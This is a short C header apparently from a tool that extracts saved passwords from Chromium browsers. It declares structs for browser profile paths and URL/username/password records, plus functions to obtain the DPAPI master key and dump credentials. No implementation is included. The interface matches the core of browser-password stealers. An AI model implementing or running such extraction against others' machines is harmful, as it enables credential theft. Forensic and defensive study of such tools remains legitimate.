#ifndef CHROMIUM_H
#define CHROMIUM_H

#include <windows.h>
#include <dpapi.h>
#include <stdio.h>

#include "base64/base64.h"
#include "sqlite3/sqlite3.h"
#include "jansson/jansson.h"
#include "sodium/sodium.h"

typedef struct {
    char* name;
    char* localState;
    char* loginData;
} Browser;

typedef struct {
    char* url;
    char* username;
    char* password;
} Credential;

typedef struct {
    Credential* creds;
    size_t size;
} credList;

Browser initBrowser(char* local_state, char* login_data, char* name);
unsigned char* getMasterKey(Browser* browser);
credList* getCredentials(Browser* browser, unsigned char* MasterKey);

#endif //CHROMIUM_H